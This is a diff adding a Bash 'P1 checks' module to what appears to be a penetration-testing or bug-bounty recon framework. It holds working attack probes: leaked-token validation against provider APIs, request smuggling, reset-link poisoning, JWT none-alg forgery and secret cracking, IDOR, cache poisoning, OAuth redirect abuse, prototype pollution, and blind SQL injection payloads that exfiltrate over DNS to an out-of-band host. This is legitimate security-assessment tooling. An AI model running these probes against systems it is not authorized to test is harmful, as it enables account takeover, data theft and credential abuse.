@@ -1,0 +1,322 @@
+# ============================================================
+# Recon Framework - P1 Checks Module (v11.5)
+# High-impact checks aimed at P1/critical findings. Each uses a
+# confirmable signal + baseline where possible; weaker checks are
+# recorded as LIKELY/REVIEW rather than CONFIRMED to keep FPs low.
+# Requires helpers from core.sh.lib and (for OOB ones) oob.sh.lib.
+# ============================================================
+
+# ── TIER 1.1: Live secret validation ────────────────────────────
+# Turns an *exposed* single-token secret into a CONFIRMED critical by
+# validating it against the provider API (calls the provider, not the target).
+secret_validation() {
+    local target="$1" output_dir="$2"
+    local sv_dir="$output_dir/secret_validation"; mkdir -p "$sv_dir"
+    local src="$output_dir/js_analysis/secrets_in_js.txt"
+    [[ -s "$src" ]] || { log_info "No high-confidence secrets to validate"; return; }
+    log_info "Validating discovered secrets against provider APIs..."
+
+    local tok
+    while read -r tok; do
+        [[ -z "$tok" ]] && continue
+        local valid="" prov=""
+        case "$tok" in
+            AIza*)  prov="google_api"
+                    curl -skg --max-time 8 "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=$tok" 2>/dev/null \
+                        | grep -qiE '"status"\s*:\s*"(OK|ZERO_RESULTS|OVER_QUERY_LIMIT|REQUEST_DENIED)"' \
+                        && ! curl -skg --max-time 8 "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=$tok" 2>/dev/null | grep -qi 'API key not valid' \
+                        && valid=1 ;;
+            ghp_*|gho_*|ghu_*|ghs_*|ghr_*) prov="github_token"
+                    [[ "$(curl -skg --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: token $tok" https://api.github.com/user 2>/dev/null)" == "200" ]] && valid=1 ;;
+            xox*)   prov="slack_token"
+                    curl -skg --max-time 8 -d "token=$tok" https://slack.com/api/auth.test 2>/dev/null | grep -q '"ok":true' && valid=1 ;;
+            sk_live_*|rk_live_*) prov="stripe_key"
+                    [[ "$(curl -skg --max-time 8 -o /dev/null -w '%{http_code}' -u "$tok:" https://api.stripe.com/v1/charges?limit=1 2>/dev/null)" == "200" ]] && valid=1 ;;
+            SG.*)   prov="sendgrid_key"
+                    [[ "$(curl -skg --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $tok" https://api.sendgrid.com/v3/scopes 2>/dev/null)" == "200" ]] && valid=1 ;;
+        esac
+        if [[ -n "$valid" ]]; then
+            echo "[VALID SECRET] provider=$prov" >> "$sv_dir/valid_secrets.txt"
+            record_finding "live_secret" "critical" "CONFIRMED" "$prov" "validated live $prov credential exposed in JS"
+        fi
+    done < <(sort -u "$src")
+    [[ -s "$sv_dir/valid_secrets.txt" ]] || log_ok "No live/valid secrets confirmed"
+}
+
+# ── TIER 1.2: HTTP request smuggling ────────────────────────────
+http_smuggling_check() {
+    local target="$1" output_dir="$2"
+    local sm_dir="$output_dir/smuggling"; mkdir -p "$sm_dir"
+    local base_url; [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    local smug_bin=""
+    command -v smuggler >/dev/null 2>&1 && smug_bin="smuggler"
+    command -v smuggler.py >/dev/null 2>&1 && smug_bin="smuggler.py"
+    if [[ -z "$smug_bin" ]]; then
+        log_info "HTTP smuggling: install 'smuggler' (github.com/defparam/smuggler) to enable"
+        return
+    fi
+    log_info "Testing HTTP request smuggling (CL.TE / TE.CL / h2c)..."
+    echo "$base_url" | timeout 120 "$smug_bin" 2>/dev/null | tee "$sm_dir/smuggler.txt" \
+        | grep -iE 'POTENTIALLY VULNERABLE|CL\.TE|TE\.CL|DISCONNECT' >/dev/null || true
+    # Timing-based smuggling is FP-prone => LIKELY, always needs manual confirmation.
+    if grep -qiE 'POTENTIALLY VULNERABLE' "$sm_dir/smuggler.txt" 2>/dev/null; then
+        record_finding "http_smuggling" "high" "LIKELY" "$base_url" "smuggler flagged CL.TE/TE.CL — manually confirm"
+    else
+        log_ok "No request smuggling indicated"
+    fi
+}
+
+# ── TIER 1.3: Password reset poisoning (ATO) ────────────────────
+# Host / X-Forwarded-Host override -> poisoned reset link. Confirmed via OOB
+# callback (the mail backend fetched our host) when interactsh is available,
+# else reflection-based REVIEW.
+password_reset_poisoning() {
+    local target="$1" output_dir="$2"
+    local pr_dir="$output_dir/reset_poisoning"; mkdir -p "$pr_dir"
+    local base_url; [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+
+    local reset_eps=()
+    if [[ -f "$endpoints_file" ]]; then
+        while read -r e; do [[ -n "$e" ]] && reset_eps+=("$e"); done < <(grep -iE '/(forgot|reset|recover|password/(reset|forgot)|api/(forgot|reset))' "$endpoints_file" 2>/dev/null | head -5)
+    fi
+    [[ ${#reset_eps[@]} -eq 0 ]] && for p in /forgot-password /reset-password /api/forgot-password /password/forgot; do reset_eps+=("${base_url}${p}"); done
+
+    local test_email="${RESET_TEST_EMAIL:-victim@example.com}"
+    log_info "Testing password-reset poisoning on ${#reset_eps[@]} endpoint(s)..."
+
+    local use_oob=0
+    if [[ "${RUN_OOB:-0}" -eq 1 ]] && check_tool interactsh-client; then oob_start "$output_dir" && use_oob=1; fi
+
+    local ep
+    for ep in "${reset_eps[@]}"; do
+        [[ -z "$ep" ]] && continue
+        local evil
+        if [[ "$use_oob" -eq 1 ]]; then evil=$(oob_token "reset_poison" "$ep"); else evil="evil-reset-$RANDOM.test"; fi
+        for hh in "Host" "X-Forwarded-Host" "X-Forwarded-Server"; do
+            local resp
+            resp=$(curl -skg --max-time 8 -X POST -H "$hh: $evil" \
+                -d "email=${test_email}&username=${test_email}" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" 2>/dev/null)
+            # Reflection-based (weaker) signal
+            if [[ "$use_oob" -ne 1 ]] && echo "$resp" | grep -qF "$evil"; then
+                record_finding "reset_poisoning" "high" "REVIEW" "$ep" "reset host reflected via $hh — check the actual reset email link"
+            fi
+        done
+    done
+    [[ "$use_oob" -eq 1 ]] && oob_poll_and_correlate
+}
+
+# ── TIER 2.1: JWT active attacks (jwt_tool) ─────────────────────
+jwt_active_attacks() {
+    local target="$1" output_dir="$2"
+    local jw_dir="$output_dir/jwt_active"; mkdir -p "$jw_dir"
+    check_tool jwt_tool || { log_info "JWT active attacks: install jwt_tool to enable"; return; }
+
+    # Source a JWT: from the auth cookie or any token captured earlier.
+    local jwt=""
+    [[ "${COOKIE:-}" =~ (eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+) ]] && jwt="${BASH_REMATCH[1]}"
+    [[ -z "$jwt" && -f "$output_dir/auth/jwt_tokens.txt" ]] && jwt=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$output_dir/auth/jwt_tokens.txt" 2>/dev/null | head -1)
+    [[ -z "$jwt" ]] && { log_info "No JWT available for active attacks"; return; }
+
+    log_info "Running jwt_tool active checks (none-alg, secret brute)..."
+    # 'none' algorithm forgery + HMAC secret brute force with a small wordlist.
+    local wl="${CONFIG[WORDLISTS_DIR]:-/tmp}/jwt-secrets.txt"
+    jwt_tool "$jwt" -X n >"$jw_dir/none.txt" 2>/dev/null || true
+    if [[ -s "$wl" ]]; then
+        jwt_tool "$jwt" -C -d "$wl" >"$jw_dir/crack.txt" 2>/dev/null || true
+        if grep -qiE 'CORRECT key|Successful|found' "$jw_dir/crack.txt" 2>/dev/null; then
+            local secret; secret=$(grep -oiE 'key.?:?.?[[:space:]]*[A-Za-z0-9._-]+' "$jw_dir/crack.txt" | head -1)
+            record_finding "jwt_weak_secret" "critical" "CONFIRMED" "$target" "JWT HMAC secret cracked ($secret) — full token forgery"
+        fi
+    else
+        log_info "Provide ${wl} to enable JWT secret brute-force"
+    fi
+}
+
+# ── TIER 2.2: BOLA / IDOR at scale (two sessions) ───────────────
+# Requires -c (user A) and -C (user B). Three-way diff: if resource needs auth
+# (no-auth != authed) but user B sees byte-identical content to user A, that is
+# horizontal access to A's object.
+bola_idor_scale() {
+    local target="$1" output_dir="$2"
+    local bd_dir="$output_dir/bola_scale"; mkdir -p "$bd_dir"
+    [[ -n "${COOKIE:-}" && -n "${COOKIE2:-}" ]] || { log_info "BOLA at scale: supply -c and -C (two sessions) to enable"; return; }
+
+    local src="$output_dir/fuzz_results/urls_with_params.txt"
+    local idurls
+    idurls=$(grep -iE '[?&/](id|uid|user|account|order|invoice|doc|object|ref|number|pid|gid)[=/]' "$src" "$output_dir/endpoints/all_endpoints.txt" 2>/dev/null | sort -u | head -30)
+    [[ -z "$idurls" ]] && { log_info "No ID-bearing endpoints for BOLA testing"; return; }
+    log_info "BOLA/IDOR differential across two sessions..."
+
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local a b none
+        a=$(curl -skg --max-time 6 -H "Cookie: $COOKIE"  "$url" 2>/dev/null | head -c 4000 | md5sum | cut -d' ' -f1)
+        b=$(curl -skg --max-time 6 -H "Cookie: $COOKIE2" "$url" 2>/dev/null | head -c 4000 | md5sum | cut -d' ' -f1)
+        local bcode ncode
+        bcode=$(curl -skg --max-time 6 -o /dev/null -w '%{http_code}' -H "Cookie: $COOKIE2" "$url" 2>/dev/null)
+        ncode=$(curl -skg --max-time 6 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null)
+        # resource is protected (unauth blocked) but user B gets identical bytes to A
+        if [[ "$bcode" == "200" && "$ncode" != "200" && "$a" == "$b" && -n "$a" && "$a" != "d41d8cd98f00b204e9800998ecf8427e" ]]; then
+            record_finding "bola_idor" "high" "LIKELY" "$url" "user B received user A's object (auth required, cross-user identical) — verify ownership"
+            echo "$url" >> "$bd_dir/bola_candidates.txt"
+        fi
+    done <<< "$idurls"
+    [[ -s "$bd_dir/bola_candidates.txt" ]] || log_ok "No cross-user BOLA differentials found"
+}
+
+# ── TIER 2.3: Web cache poisoning ───────────────────────────────
+# Uses a per-run cache-buster so we only poison OUR cache key (never real users).
+web_cache_poisoning() {
+    local target="$1" output_dir="$2"
+    local wc_dir="$output_dir/cache_poisoning"; mkdir -p "$wc_dir"
+    local base_url; [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+    log_info "Testing web cache poisoning (unkeyed headers)..."
+
+    local unkeyed=(X-Forwarded-Host X-Forwarded-Scheme X-Host X-Forwarded-Server X-HTTP-Host-Override X-Original-URL X-Rewrite-URL)
+    local hdr
+    for hdr in "${unkeyed[@]}"; do
+        local cb="cpz$RANDOM$RANDOM"
+        local canary="cnry${RANDOM}x.test"
+        local turl="${base_url}?cb=${cb}"
+        # 1) poison our own cache key with the header
+        curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} -H "${hdr}: ${canary}" "$turl" >/dev/null 2>&1
+        # 2) request the SAME key WITHOUT the header; if canary comes back, it was cached
+        local clean; clean=$(curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$turl" 2>/dev/null)
+        if echo "$clean" | grep -qF "$canary"; then
+            record_finding "cache_poisoning" "high" "CONFIRMED" "$turl" "unkeyed '$hdr' reflected and served from cache to a clean request"
+            echo "[CACHE POISONING] $hdr -> $turl" >> "$wc_dir/findings.txt"
+        fi
+        throttle
+    done
+    [[ -s "$wc_dir/findings.txt" ]] || log_ok "No cache poisoning confirmed"
+}
+
+# ── TIER 2.4: OAuth redirect_uri / state ────────────────────────
+oauth_redirect_check() {
+    local target="$1" output_dir="$2"
+    local oa_dir="$output_dir/oauth_redirect"; mkdir -p "$oa_dir"
+    local base_url; [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+    log_info "Testing OAuth redirect_uri validation..."
+
+    local authz_paths="/oauth/authorize /oauth2/authorize /authorize /connect/authorize /o/oauth2/auth /login/oauth/authorize"
+    local attacker="https://attacker-evil-$RANDOM.example.com/cb"
+    local p
+    for p in $authz_paths; do
+        local url="${base_url}${p}?response_type=token&client_id=test&scope=openid&redirect_uri=${attacker}"
+        local loc
+        loc=$(curl -skg --max-time 6 -o /dev/null -D - --max-redirs 0 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$url" 2>/dev/null | grep -i '^location:' | tr -d '\r')
+        if echo "$loc" | grep -qF "attacker-evil"; then
+            record_finding "oauth_redirect_uri" "high" "CONFIRMED" "${base_url}${p}" "unvalidated redirect_uri -> token/code exfiltration ($loc)"
+            echo "[OAUTH OPEN REDIRECT] ${base_url}${p} -> $loc" >> "$oa_dir/findings.txt"
+        fi
+    done
+    [[ -s "$oa_dir/findings.txt" ]] || log_ok "No OAuth redirect_uri issues confirmed"
+}
+
+# ── TIER 3.1: Dependency confusion ──────────────────────────────
+dependency_confusion_check() {
+    local target="$1" output_dir="$2"
+    local dc_dir="$output_dir/dependency_confusion"; mkdir -p "$dc_dir"
+    local base_url; [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    local pkg; pkg=$(curl -skg --max-time 8 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${base_url}/package.json" 2>/dev/null)
+    echo "$pkg" | grep -q '"dependencies"' || { log_info "No exposed package.json for dependency-confusion check"; return; }
+    log_info "Checking exposed npm deps for public-registry gaps..."
+
+    # extract dependency names
+    echo "$pkg" | grep -oE '"[@a-z0-9._/-]+"[[:space:]]*:[[:space:]]*"[^"]+"' \
+        | grep -oE '"[@a-z0-9._/-]+"' | tr -d '"' | grep -vE '^(dependencies|devDependencies|name|version|scripts|description)$' \
+        | sort -u > "$dc_dir/deps.txt"
+    local dep
+    while read -r dep; do
+        [[ -z "$dep" ]] && continue
+        # public registry 404 => name unclaimed publicly => confusion candidate
+        local code; code=$(curl -skg --max-time 6 -o /dev/null -w '%{http_code}' "https://registry.npmjs.org/${dep}" 2>/dev/null)
+        if [[ "$code" == "404" ]]; then
+            record_finding "dependency_confusion" "high" "REVIEW" "$dep" "npm dependency not on public registry — potential dependency confusion"
+            echo "$dep" >> "$dc_dir/unclaimed.txt"
+        fi
+    done < "$dc_dir/deps.txt"
+    [[ -s "$dc_dir/unclaimed.txt" ]] || log_ok "No dependency-confusion candidates"
+}
+
+# ── TIER 3.2: SAML discovery (XSW is manual) ────────────────────
+saml_check() {
+    local target="$1" output_dir="$2"
+    local sa_dir="$output_dir/saml"; mkdir -p "$sa_dir"
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || { log_info "SAML: no endpoints file"; return; }
+    grep -iE '/(saml|sso|acs|saml2|adfs)|SAMLResponse=' "$endpoints_file" 2>/dev/null | sort -u > "$sa_dir/saml_endpoints.txt"
+    if [[ -s "$sa_dir/saml_endpoints.txt" ]]; then
+        record_finding "saml_endpoint" "info" "REVIEW" "$(head -1 "$sa_dir/saml_endpoints.txt")" "SAML/SSO endpoint(s) found — manually test signature wrapping (XSW) / unsigned assertion acceptance"
+    else
+        log_ok "No SAML/SSO endpoints found"
+    fi
+}
+
+# ── TIER 3.3: Server-side prototype pollution -> gadget ─────────
+# Node/Express gadget: polluting "json spaces" makes res.json() pretty-print.
+server_side_pp_check() {
+    local target="$1" output_dir="$2"
+    local pp_dir="$output_dir/server_pp"; mkdir -p "$pp_dir"
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || { log_info "Server-side PP: no endpoints"; return; }
+    log_info "Testing server-side prototype pollution (json-spaces gadget)..."
+
+    grep -iE '/(api|rest|graphql|v[0-9]+)/' "$endpoints_file" 2>/dev/null | sort -u | head -10 > "$pp_dir/targets.txt"
+    local ep
+    while read -r ep; do
+        [[ -z "$ep" ]] && continue
+        # baseline: is the JSON response already pretty-printed? (a line starting with indentation + quote)
+        local before; before=$(curl -skg --max-time 6 -H "Content-Type: application/json" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" 2>/dev/null)
+        echo "$before" | grep -qE '^[[:space:]]{2,}"' && continue    # already indented; skip (avoid FP)
+        # pollute
+        curl -skg --max-time 6 -X POST -H "Content-Type: application/json" \
+            -d '{"__proto__":{"json spaces":10}}' ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" >/dev/null 2>&1
+        curl -skg --max-time 6 -X POST -H "Content-Type: application/json" \
+            -d '{"constructor":{"prototype":{"json spaces":10}}}' ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" >/dev/null 2>&1
+        # re-check: did responses become pretty-printed?
+        local after; after=$(curl -skg --max-time 6 -H "Content-Type: application/json" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" 2>/dev/null)
+        if ! echo "$before" | grep -qE '^[[:space:]]{2,}"' && echo "$after" | grep -qE '^[[:space:]]{2,}"'; then
+            record_finding "server_side_pp" "high" "LIKELY" "$ep" "response formatting changed after __proto__ json-spaces pollution — server-side prototype pollution"
+            echo "$ep" >> "$pp_dir/findings.txt"
+        fi
+    done < "$pp_dir/targets.txt"
+    [[ -s "$pp_dir/findings.txt" ]] || log_ok "No server-side prototype pollution detected"
+}
+
+# ── TIER 3.4: Blind SQLi via OOB (DNS exfil) ────────────────────
+blind_sqli_oob() {
+    local target="$1" output_dir="$2"
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || { log_info "Blind SQLi OOB: no parameterised URLs"; return; }
+    if ! { [[ "${RUN_OOB:-0}" -eq 1 ]] && check_tool interactsh-client; }; then
+        log_info "Blind SQLi OOB: run with -x and interactsh-client to enable"
+        return
+    fi
+    oob_start "$output_dir" || return
+    log_info "Testing blind SQLi via OOB (MSSQL/Oracle/MySQL DNS exfil)..."
+
+    head -15 "$param_urls" | while read -r url; do
+        [[ -z "$url" ]] && continue
+        local k
+        while read -r k; do
+            [[ -z "$k" ]] && continue
+            local host; host=$(oob_token "sqli_oob" "$url [param=$k]")
+            local payloads=(
+                "1';DECLARE @q VARCHAR(99);SET @q='\\\\${host}\\a';EXEC master..xp_dirtree @q;--"
+                "1' AND (SELECT UTL_INADDR.get_host_address('${host}')) IS NULL--"
+                "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\${host}\\\\a'))--"
+            )
+            local p
+            for p in "${payloads[@]}"; do
+                local turl; turl=$(set_param "$url" "$k" "$p")
+                curl -skg --max-time 6 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$turl" >/dev/null 2>&1 || true
+            done
+            throttle
+        done < <(param_keys "$url")
+    done
+    oob_poll_and_correlate
+}
